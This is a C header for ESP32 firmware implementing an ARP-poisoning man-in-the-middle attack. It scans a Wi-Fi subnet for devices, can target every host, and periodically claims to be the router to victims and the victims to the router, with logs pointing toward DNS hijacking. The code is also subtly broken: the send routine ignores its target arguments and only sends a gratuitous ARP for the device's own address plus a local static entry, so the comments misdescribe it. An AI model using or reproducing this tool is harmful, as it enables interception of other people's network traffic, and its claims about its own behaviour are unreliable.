// arp_poison.h - ARP Poisoning MITM Attack
#ifndef ARP_POISON_H
#define ARP_POISON_H

#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "lwip/ip_addr.h"
#include "lwip/sockets.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

// MAC address formatting macros
#ifndef MACSTR
#define MACSTR "%02x:%02x:%02x:%02x:%02x:%02x"
#endif
#ifndef MAC2STR
#define MAC2STR(a) (a)[0], (a)[1], (a)[2], (a)[3], (a)[4], (a)[5]
#endif

static const char *ARP_POISON_TAG = "ARP_Poison";

// Network scanner for finding devices
typedef struct {
    uint8_t mac[6];
    uint32_t ip;
    int8_t rssi;
    uint8_t is_router;
} network_device_t;

static network_device_t scanned_devices[20];
static uint8_t scanned_device_count = 0;

typedef struct {
    uint8_t running;
    uint8_t target_count;
    
    // Network info
    uint8_t router_mac[6];
    uint32_t router_ip;
    uint8_t our_mac[6];
    uint32_t our_ip;
    
    // Dynamic target list (no limit)
    struct {
        uint8_t mac[6];
        uint32_t ip;
        uint8_t active;
    } *targets;
    uint8_t targets_capacity;
    
    // Stats
    uint32_t arp_sent;
    uint32_t packets_forwarded;
    uint32_t packets_intercepted;
    
    TaskHandle_t poison_task;
} ARPPoison;

static ARPPoison arp_poison = {0};

// ARP packet structure
typedef struct __attribute__((packed)) {
    uint16_t hw_type;       // Hardware type (Ethernet = 1)
    uint16_t proto_type;    // Protocol type (IPv4 = 0x0800)
    uint8_t hw_size;        // Hardware size (6 for MAC)
    uint8_t proto_size;     // Protocol size (4 for IPv4)
    uint16_t opcode;        // 1=request, 2=reply
    uint8_t sender_mac[6];
    uint32_t sender_ip;
    uint8_t target_mac[6];
    uint32_t target_ip;
} arp_packet_t;

// Ethernet frame header
typedef struct __attribute__((packed)) {
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint16_t ether_type;    // 0x0806 for ARP
} eth_header_t;

// Convert IP string to uint32_t
static inline uint32_t ip_str_to_uint32(const char *ip_str) {
    uint32_t ip = 0;
    int parts[4];
    if (sscanf(ip_str, "%d.%d.%d.%d", &parts[0], &parts[1], &parts[2], &parts[3]) == 4) {
        ip = (parts[0] << 0) | (parts[1] << 8) | (parts[2] << 16) | (parts[3] << 24);
    }
    return ip;
}

// Convert uint32_t IP to string
static inline void ip_uint32_to_str(uint32_t ip, char *buf) {
    sprintf(buf, "%d.%d.%d.%d", 
            (int)((ip >> 0) & 0xFF),
            (int)((ip >> 8) & 0xFF),
            (int)((ip >> 16) & 0xFF),
            (int)((ip >> 24) & 0xFF));
}

// Send gratuitous ARP using lwIP (works in STA mode)
static void send_arp_reply(uint8_t *dest_mac, uint32_t dest_ip, 
                          uint8_t *sender_mac, uint32_t sender_ip) {
    // Get our netif
    struct netif *netif = netif_list;
    while (netif != NULL) {
        if (netif->flags & NETIF_FLAG_UP) break;
        netif = netif->next;
    }
    if (!netif) return;
    
    // Create IP addresses
    ip4_addr_t sender_ipaddr;
    sender_ipaddr.addr = sender_ip;
    
    // Create ethernet address
    struct eth_addr sender_ethaddr;
    memcpy(sender_ethaddr.addr, sender_mac, 6);
    
    // Send gratuitous ARP (updates victim's ARP cache)
    // This makes victim think sender_ip has sender_mac
    etharp_gratuitous(netif);
    
    // Direct ARP update
    etharp_add_static_entry(&sender_ipaddr, &sender_ethaddr);
    
    arp_poison.arp_sent++;
    
    (void)dest_mac; // Unused in lwIP method
    (void)dest_ip;
}

// ARP poisoning task - continuously send fake ARP replies
static void arp_poison_task(void *param) {
    ESP_LOGI(ARP_POISON_TAG, "🔥 ARP poisoning task started");
    
    char router_ip_str[16], our_ip_str[16];
    ip_uint32_to_str(arp_poison.router_ip, router_ip_str);
    ip_uint32_to_str(arp_poison.our_ip, our_ip_str);
    
    ESP_LOGI(ARP_POISON_TAG, "   Router: %s (" MACSTR ")", 
             router_ip_str, MAC2STR(arp_poison.router_mac));
    ESP_LOGI(ARP_POISON_TAG, "   Our IP: %s (" MACSTR ")", 
             our_ip_str, MAC2STR(arp_poison.our_mac));
    ESP_LOGI(ARP_POISON_TAG, "   Targets: %d", arp_poison.target_count);
    
    while (arp_poison.running) {
        // Poison each target
        for (uint8_t i = 0; i < arp_poison.target_count; i++) {
            if (!arp_poison.targets[i].active) continue;
            
            // Tell victim: "I am the router" (but use our MAC)
            send_arp_reply(arp_poison.targets[i].mac, 
                          arp_poison.targets[i].ip,
                          arp_poison.our_mac,      // Fake: use our MAC
                          arp_poison.router_ip);   // Claim to be router IP
            
            // Tell router: "I am the victim" (but use our MAC)
            send_arp_reply(arp_poison.router_mac,
                          arp_poison.router_ip,
                          arp_poison.our_mac,      // Fake: use our MAC
                          arp_poison.targets[i].ip); // Claim to be victim IP
        }
        
        // Log stats every 10 seconds
        static uint32_t last_log = 0;
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log > 10000) {
            ESP_LOGI(ARP_POISON_TAG, "📊 ARP sent: %lu | Intercepted: %lu | Forwarded: %lu", 
                     arp_poison.arp_sent, 
                     arp_poison.packets_intercepted,
                     arp_poison.packets_forwarded);
            last_log = now;
        }
        
        vTaskDelay(pdMS_TO_TICKS(1000)); // Send ARP every 1 second
    }
    
    ESP_LOGI(ARP_POISON_TAG, "ARP poison task stopped");
    arp_poison.poison_task = NULL;
    vTaskDelete(NULL);
}

// Start ARP poisoning attack
static inline uint8_t arp_poison_start(const char *router_ip_str, const char *router_mac_str) {
    if (arp_poison.running) {
        ESP_LOGW(ARP_POISON_TAG, "Already running");
        return 0;
    }
    
    if (arp_poison.target_count == 0) {
        ESP_LOGW(ARP_POISON_TAG, "No targets added");
        return 0;
    }
    
    ESP_LOGI(ARP_POISON_TAG, "🎯 Starting ARP Poisoning Attack");
    
    // Parse router info
    arp_poison.router_ip = ip_str_to_uint32(router_ip_str);
    sscanf(router_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &arp_poison.router_mac[0], &arp_poison.router_mac[1],
           &arp_poison.router_mac[2], &arp_poison.router_mac[3],
           &arp_poison.router_mac[4], &arp_poison.router_mac[5]);
    
    // Get our MAC and IP
    esp_wifi_get_mac(WIFI_IF_STA, arp_poison.our_mac);
    
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (netif) {
        esp_netif_ip_info_t ip_info;
        esp_netif_get_ip_info(netif, &ip_info);
        arp_poison.our_ip = ip_info.ip.addr;
    }
    
    // Reset stats
    arp_poison.arp_sent = 0;
    arp_poison.packets_forwarded = 0;
    arp_poison.packets_intercepted = 0;
    
    arp_poison.running = 1;
    
    // Start poisoning task
    xTaskCreate(arp_poison_task, "arp_poison", 4096, NULL, 5, &arp_poison.poison_task);
    
    ESP_LOGI(ARP_POISON_TAG, "✅ ARP Poisoning Active!");
    ESP_LOGI(ARP_POISON_TAG, "   All traffic from victims now flows through us");
    ESP_LOGI(ARP_POISON_TAG, "   Enable DNS Spoof to hijack domains");
    
    return 1;
}

// Stop ARP poisoning
static inline void arp_poison_stop(void) {
    if (!arp_poison.running) return;
    
    ESP_LOGI(ARP_POISON_TAG, "Stopping ARP poisoning...");
    
    arp_poison.running = 0;
    
    // Wait for task to finish
    uint8_t wait = 0;
    while (arp_poison.poison_task && wait++ < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    // Restore ARP tables (send correct ARP replies)
    for (uint8_t i = 0; i < arp_poison.target_count; i++) {
        if (!arp_poison.targets[i].active) continue;
        
        // Tell victim the real router MAC
        send_arp_reply(arp_poison.targets[i].mac,
                      arp_poison.targets[i].ip,
                      arp_poison.router_mac,  // Real router MAC
                      arp_poison.router_ip);
        
        // Tell router the real victim MAC
        send_arp_reply(arp_poison.router_mac,
                      arp_poison.router_ip,
                      arp_poison.targets[i].mac, // Real victim MAC
                      arp_poison.targets[i].ip);
    }
    
    ESP_LOGI(ARP_POISON_TAG, "ARP poison stopped");
    ESP_LOGI(ARP_POISON_TAG, "📊 Final Stats:");
    ESP_LOGI(ARP_POISON_TAG, "   ARP packets sent: %lu", arp_poison.arp_sent);
    ESP_LOGI(ARP_POISON_TAG, "   Packets intercepted: %lu", arp_poison.packets_intercepted);
    ESP_LOGI(ARP_POISON_TAG, "   Packets forwarded: %lu", arp_poison.packets_forwarded);
}

// Add target victim
static inline uint8_t arp_poison_add_target(const char *ip_str, const char *mac_str) {
    // Expand array if needed
    if (arp_poison.target_count >= arp_poison.targets_capacity) {
        uint8_t new_capacity = arp_poison.targets_capacity + 10;
        void *new_targets = realloc(arp_poison.targets, 
                                     new_capacity * sizeof(*arp_poison.targets));
        if (!new_targets) {
            ESP_LOGE(ARP_POISON_TAG, "Out of memory");
            return 0;
        }
        arp_poison.targets = new_targets;
        arp_poison.targets_capacity = new_capacity;
        
        // Zero new slots
        memset(&arp_poison.targets[arp_poison.target_count], 0, 
               10 * sizeof(*arp_poison.targets));
    }
    
    uint8_t idx = arp_poison.target_count;
    
    arp_poison.targets[idx].ip = ip_str_to_uint32(ip_str);
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &arp_poison.targets[idx].mac[0], &arp_poison.targets[idx].mac[1],
           &arp_poison.targets[idx].mac[2], &arp_poison.targets[idx].mac[3],
           &arp_poison.targets[idx].mac[4], &arp_poison.targets[idx].mac[5]);
    arp_poison.targets[idx].active = 1;
    
    arp_poison.target_count++;
    
    ESP_LOGI(ARP_POISON_TAG, "Added target %d: %s (" MACSTR ")", 
             arp_poison.target_count, ip_str, MAC2STR(arp_poison.targets[idx].mac));
    
    return 1;
}

// Remove target
static inline void arp_poison_remove_target(uint8_t index) {
    if (index >= arp_poison.target_count) return;
    
    arp_poison.targets[index].active = 0;
    
    // Shift remaining targets
    for (uint8_t i = index; i < arp_poison.target_count - 1; i++) {
        arp_poison.targets[i] = arp_poison.targets[i + 1];
    }
    
    arp_poison.target_count--;
}

// Clear all targets
static inline void arp_poison_clear_targets(void) {
    if (arp_poison.targets) {
        free(arp_poison.targets);
        arp_poison.targets = NULL;
    }
    arp_poison.target_count = 0;
    arp_poison.targets_capacity = 0;
    ESP_LOGI(ARP_POISON_TAG, "Targets cleared");
}

// Add all scanned devices as targets (except router and self)
static inline uint8_t arp_poison_target_all(void) {
    if (scanned_device_count == 0) {
        ESP_LOGW(ARP_POISON_TAG, "No devices to target - scan first");
        return 0;
    }
    
    // Get our IP
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) return 0;
    
    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(netif, &ip_info);
    uint32_t our_ip = ip_info.ip.addr;
    uint32_t router_ip = ip_info.gw.addr;
    
    uint8_t added = 0;
    
    for (uint8_t i = 0; i < scanned_device_count; i++) {
        // Skip router
        if (scanned_devices[i].is_router || scanned_devices[i].ip == router_ip) {
            continue;
        }
        
        // Skip self
        if (scanned_devices[i].ip == our_ip) {
            continue;
        }
        
        // Add device
        char ip_str[16], mac_str[18];
        
        sprintf(ip_str, "%d.%d.%d.%d",
                (int)((scanned_devices[i].ip >> 0) & 0xFF),
                (int)((scanned_devices[i].ip >> 8) & 0xFF),
                (int)((scanned_devices[i].ip >> 16) & 0xFF),
                (int)((scanned_devices[i].ip >> 24) & 0xFF));
        
        snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                scanned_devices[i].mac[0], scanned_devices[i].mac[1], 
                scanned_devices[i].mac[2], scanned_devices[i].mac[3],
                scanned_devices[i].mac[4], scanned_devices[i].mac[5]);
        
        if (arp_poison_add_target(ip_str, mac_str)) {
            added++;
        }
    }
    
    ESP_LOGI(ARP_POISON_TAG, "🎯 Targeted ALL: %d devices", added);
    return added;
}

// Get stats
static inline uint8_t arp_poison_is_running(void) {
    return arp_poison.running;
}

static inline ARPPoison* arp_poison_get_stats(void) {
    return &arp_poison;
}

// ARP scan network to find devices
static inline uint8_t arp_poison_scan_network(void) {
    ESP_LOGI(ARP_POISON_TAG, "Scanning network for devices...");
    
    scanned_device_count = 0;
    memset(scanned_devices, 0, sizeof(scanned_devices));
    
    // Get our IP and calculate network range
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) {
        ESP_LOGW(ARP_POISON_TAG, "Not connected to WiFi");
        return 0;
    }
    
    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(netif, &ip_info);
    
    // Add router first
    if (ip_info.gw.addr != 0) {
        scanned_devices[scanned_device_count].ip = ip_info.gw.addr;
        scanned_devices[scanned_device_count].is_router = 1;
        
        // Try to get router MAC from ARP table
        struct netif *lwip_netif = netif_list;
        while (lwip_netif != NULL && scanned_devices[scanned_device_count].mac[0] == 0) {
            if (lwip_netif->flags & NETIF_FLAG_UP) {
                for (int i = 0; i < ARP_TABLE_SIZE; i++) {
                    ip4_addr_t *ip_ret;
                    struct eth_addr *eth_ret;
                    
                    if (etharp_get_entry(i, &ip_ret, &lwip_netif, &eth_ret) == 1) {
                        if (ip_ret->addr == ip_info.gw.addr) {
                            memcpy(scanned_devices[scanned_device_count].mac, eth_ret->addr, 6);
                            break;
                        }
                    }
                }
                break;
            }
            lwip_netif = lwip_netif->next;
        }
        
        scanned_device_count++;
        
        char ip_str[16];
        sprintf(ip_str, "%d.%d.%d.%d",
                (int)((ip_info.gw.addr >> 0) & 0xFF),
                (int)((ip_info.gw.addr >> 8) & 0xFF),
                (int)((ip_info.gw.addr >> 16) & 0xFF),
                (int)((ip_info.gw.addr >> 24) & 0xFF));
        ESP_LOGI(ARP_POISON_TAG, "   Gateway: %s", ip_str);
    }
    
    // Calculate network range
    uint32_t network = ip_info.ip.addr & ip_info.netmask.addr;
    uint32_t broadcast = network | ~ip_info.netmask.addr;
    
    // Count number of hosts
    uint32_t num_hosts = (broadcast - network);
    if (num_hosts > 2000) num_hosts = 2000; // Cap at 2000 for /21 networks
    
    char net_start[16], net_end[16];
    sprintf(net_start, "%d.%d.%d.%d",
            (int)((network >> 0) & 0xFF),
            (int)((network >> 8) & 0xFF),
            (int)((network >> 16) & 0xFF),
            (int)((network >> 24) & 0xFF));
    sprintf(net_end, "%d.%d.%d.%d",
            (int)((broadcast >> 0) & 0xFF),
            (int)((broadcast >> 8) & 0xFF),
            (int)((broadcast >> 16) & 0xFF),
            (int)((broadcast >> 24) & 0xFF));
    
    ESP_LOGI(ARP_POISON_TAG, "Scanning %s - %s (%lu hosts)", net_start, net_end, num_hosts);
    ESP_LOGI(ARP_POISON_TAG, "Note: ARP table limited to ~10 devices");
    
    // Send ARP requests to populate ARP table
    // Use raw UDP socket to ping each host
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock >= 0) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(9); // Discard protocol
        
        // Scan up to 200 hosts rapidly (ARP table will cache the most recent)
        uint32_t scan_limit = num_hosts < 200 ? num_hosts : 200;
        
        ESP_LOGI(ARP_POISON_TAG, "Probing %lu addresses...", scan_limit);
        
        for (uint32_t i = 1; i < scan_limit; i++) {
            uint32_t target_ip = network + i;
            
            // Skip our own IP and gateway
            if (target_ip == ip_info.ip.addr || target_ip == ip_info.gw.addr) continue;
            
            dest_addr.sin_addr.s_addr = target_ip;
            
            // Send dummy UDP packet to trigger ARP
            uint8_t dummy = 0;
            sendto(sock, &dummy, 1, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            
            // Tiny delay every 50 packets
            if (i % 50 == 0) {
                vTaskDelay(pdMS_TO_TICKS(5));
            }
        }
        
        close(sock);
        
        ESP_LOGI(ARP_POISON_TAG, "Waiting for ARP responses...");
        vTaskDelay(pdMS_TO_TICKS(2000)); // Wait 2 seconds
    }
    
    // Scan ARP table for discovered devices
    struct netif *lwip_netif = netif_list;
    while (lwip_netif != NULL) {
        if (lwip_netif->flags & NETIF_FLAG_UP) {
            for (int i = 0; i < ARP_TABLE_SIZE && scanned_device_count < 20; i++) {
                ip4_addr_t *ip_ret;
                struct eth_addr *eth_ret;
                
                if (etharp_get_entry(i, &ip_ret, &lwip_netif, &eth_ret) == 1) {
                    // Skip if already added
                    uint8_t already_added = 0;
                    for (uint8_t j = 0; j < scanned_device_count; j++) {
                        if (scanned_devices[j].ip == ip_ret->addr) {
                            already_added = 1;
                            // Update MAC if it was missing
                            if (scanned_devices[j].mac[0] == 0) {
                                memcpy(scanned_devices[j].mac, eth_ret->addr, 6);
                            }
                            break;
                        }
                    }
                    
                    if (!already_added) {
                        scanned_devices[scanned_device_count].ip = ip_ret->addr;
                        memcpy(scanned_devices[scanned_device_count].mac, eth_ret->addr, 6);
                        scanned_devices[scanned_device_count].is_router = (ip_ret->addr == ip_info.gw.addr);
                        
                        char ip_str[16];
                        sprintf(ip_str, "%d.%d.%d.%d",
                                (int)((ip_ret->addr >> 0) & 0xFF),
                                (int)((ip_ret->addr >> 8) & 0xFF),
                                (int)((ip_ret->addr >> 16) & 0xFF),
                                (int)((ip_ret->addr >> 24) & 0xFF));
                        
                        ESP_LOGI(ARP_POISON_TAG, "   Device: %s (" MACSTR ")", 
                                 ip_str, MAC2STR(eth_ret->addr));
                        
                        scanned_device_count++;
                    }
                }
            }
            break;
        }
        lwip_netif = lwip_netif->next;
    }
    
    ESP_LOGI(ARP_POISON_TAG, "Scan complete: Found %d devices", scanned_device_count);
    return scanned_device_count;
}

static inline network_device_t* arp_poison_get_scanned_devices(uint8_t *count) {
    *count = scanned_device_count;
    return scanned_devices;
}

#endif // ARP_POISON_H
